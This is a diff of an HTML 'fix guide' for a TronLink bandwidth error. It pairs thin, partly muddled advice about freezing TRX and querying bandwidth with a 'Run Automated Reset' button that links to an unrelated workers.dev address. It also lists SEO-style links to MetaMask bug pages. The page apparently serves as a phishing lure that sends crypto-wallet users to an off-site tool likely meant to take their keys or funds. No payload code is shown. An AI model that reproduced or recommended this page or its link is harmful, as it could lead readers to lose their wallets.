@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #1a1a24;
+        font-family: BlinkMacSystemFont;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,17 +42,17 @@
 <h1>Tronlink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message indicating a bandwidth issue when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink.</li>
+<li>Users encounter an error message "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth, which is a resource required for transactions on the TRON network. Each account has a limited amount of bandwidth that replenishes over time. When this limit is exceeded, transactions cannot be processed.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions and execute smart contracts.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens, which allocates more bandwidth.</li>
-<li>Adjust the transaction parameters to require less bandwidth, such as reducing the transaction size or waiting for bandwidth to replenish.</li>
-<li>Use the following JSON-RPC command to check the current bandwidth:</li>
+<li>Increase the account bandwidth by freezing TRX tokens for bandwidth.</li>
+<li>Check and adjust the transaction parameters to optimize energy consumption.</li>
+<li>Use the following JSON-RPC command to query the account's bandwidth:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
@@ -66,14 +66,14 @@
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex debugging and direct access to the TRON network.</p>
+<p>Consider using an external console for more advanced troubleshooting and manual overrides.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON account with TronLink installed and set up.</li>
-<li>Basic understanding of TRON network resources (bandwidth and energy).</li>
-<li>Familiarity with JSON-RPC commands for interacting with the TRON network.</li>
+<li>A TRON account with sufficient TRX balance.</li>
+<li>TronLink extension installed and configured.</li>
+<li>Basic understanding of TRON network and transaction mechanics.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reconnect</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
